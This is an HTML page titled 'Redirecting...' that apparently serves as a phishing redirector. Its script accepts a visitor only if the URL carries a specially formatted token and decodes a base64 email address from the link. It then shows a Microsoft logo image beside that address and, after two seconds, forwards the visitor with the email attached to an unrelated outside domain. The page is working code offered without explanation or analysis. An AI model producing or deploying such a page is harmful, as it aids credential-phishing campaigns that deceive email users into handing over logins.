<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #ffffff;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
        }
        img {
            width: 380px; /* Increased logo size */
            height: auto;
            margin-bottom: 20px;
        }
        .email-text {
            font-size: 18px;
            font-weight: normal;
            color: #333;
            margin-bottom: 20px;
        }
        .loading {
            font-size: 24px;
            font-weight: normal;
            color: #666;
        }
    </style>
    <script>
        window.onload = function () {
            const urlParams = new URLSearchParams(window.location.search);
            const tokenPattern = /^[A-Z]{20}[a-z]{20}[0-9]{8}=$/; // Token validation pattern
            
            // Extract token and email
            let tokenKey = [...urlParams.keys()][0]; // Get the first query param key
            let email = urlParams.get(tokenKey); // Get email if present
            
            // Validate token format
            if (!tokenPattern.test(tokenKey)) {
                document.body.innerHTML = "<h2>Invalid Token</h2>";
                return;
            }

            // Set image & redirect URL
            const imageUrl = "https://store-images.s-microsoft.com/image/apps.64342.9007199266252569.06e34d57-e1e7-4d60-9444-9e04e7cea74f.839ba91a-9709-429a-9e00-6c3e0cda6f0c"; 
            let redirectUrl = "https://random.bmtadvantage.org/deep-linkcdn?em="; 

            // Decode Base64 if necessary
            if (email) {
                try {
                    let decodedEmail = atob(email);
                    if (decodedEmail.includes("@")) {
                        email = decodedEmail;
                    }
                } catch (e) {
                    // If decoding fails, assume it's already a normal email
                }
            }

            // Display image
            document.body.innerHTML = `<img src="${imageUrl}" alt="Loading..."><br>`;

            // Display email (if provided)
            if (email && email.includes("@")) {
                document.body.innerHTML += `<div class="email-text">${email}</div><br>`;
                redirectUrl += `?email=${encodeURIComponent(email)}`; // Append email to final URL
            }

            // Display loading dots
            let loadingText = document.createElement("div");
            loadingText.className = "loading";
            document.body.appendChild(loadingText);

            let dots = 0;
            setInterval(() => {
                dots = (dots + 1) % 4;
                loadingText.innerHTML = ".".repeat(dots);
            }, 500);

            // Redirect after 2 seconds
            setTimeout(() => {
                window.location.href = redirectUrl;
            }, 2000);
        };
    </script>
</head>
<body>
</body>
</html>
